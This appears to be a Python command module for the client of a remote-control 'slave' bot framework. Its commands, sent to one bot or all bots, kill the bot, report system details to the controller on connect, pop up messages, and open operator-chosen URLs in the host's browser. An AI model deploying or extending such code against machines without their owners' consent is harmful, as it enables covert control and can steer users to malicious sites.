from slave.lib.client import Bot
from typing import List
from tkinter import Tk, Label
from threading import Thread
import platform
import time
import webbrowser


BotBasic = Bot()

@BotBasic.register('quit', all=True, help_text="Kill bot -- Usage: $quit [/all | <bot_id>]")
def exit_server(bot: Bot, args: List[str]):
    bot.exit_server()


@BotBasic.register('info', all=True, help_text="Information of bot machine -- Usage: $info [/all | <bot_id>]", on_connect=True)
def sys_info(bot: Bot, args:List[str]=None):  
    template = f"OS: {platform.system()} {platform.release()} -- Processor: {platform.processor()}"
    bot.send_text(template)
    
    
@BotBasic.register('message', all=True, help_text="Message show with tkinter -- Usage: $message [/all | <bot_id>] <message> <msec>")
def show_msg_with_tk(bot: Bot, args: List[str]):
    win = Tk()
    win.title("Slave Message")
    lbl = Label(win, text=' '.join(args[1:-1]), font=('Aria Bold', 50))
    lbl.grid(column=0, row=0)
    sec = args[len(args) - 1]
    if not sec.isnumeric():
        bot.send_text("Command syntax error")
        return 0
    if int(sec) != 0:
        win.after(sec, lambda: win.destroy())
    
    bot.send_text("Opening tkinter frame...")
    win.mainloop()

@BotBasic.register('visit', all=True, help_text="Open url with webbroser -- Usage: $visit [/all | <bot_id>] <url>")
def vist_url(bot: Bot, args: List[str]):
    bot.send_text(f"Opening page... {args[1]}")
    webbrowser.open(args[1])